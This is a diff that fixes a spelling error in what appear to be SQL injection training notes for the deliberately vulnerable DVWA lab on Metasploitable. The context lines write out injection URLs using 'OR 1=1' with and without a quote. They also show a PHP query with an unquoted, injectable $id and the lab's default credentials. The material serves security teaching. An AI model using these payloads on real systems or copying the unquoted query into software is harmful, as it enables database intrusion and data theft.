@@ -42,7 +42,7 @@ See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Che
   Use DVWA (<metasploitable IP> then choose DVWA with admin/password) and put the DVWA Security to medium.
   If you try to inject data as above, the system gives now an error:
     <ms IP>/dvwa/vulnerabilities/sqli/?id=pwd' OR 1=1 %23&Submit=Submit#
-  Return on the login page and click on "View soruce" then find that line:
+  Return on the login page and click on "View source" then find that line:
     $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id";
   >>> there is no ' around the $id at the end of the line. /!\ This could be a idea to find vulnerabilities.
   So try without "'": <ms IP>/dvwa/vulnerabilities/sqli/?id=pwd OR 1=1 %23&Submit=Submit#
@@ -135,7 +135,7 @@ See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Che
 >@  Use DVWA (<metasploitable IP> then choose DVWA with admin/password) and put the DVWA Security to medium.
 >@  If you try to inject data as above, the system gives now an error:
 >@    <ms IP>/dvwa/vulnerabilities/sqli/?id=pwd' OR 1=1 %23&Submit=Submit#
->@  Return on the login page and click on "View soruce" then find that line:
+>@  Return on the login page and click on "View source" then find that line:
 >@    $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id";
 >@  >>> there is no ' around the $id at the end of the line. /!\ This could be a idea to find vulnerabilities.
 >@  So try without "'": <ms IP>/dvwa/vulnerabilities/sqli/?id=pwd OR 1=1 %23&Submit=Submit#
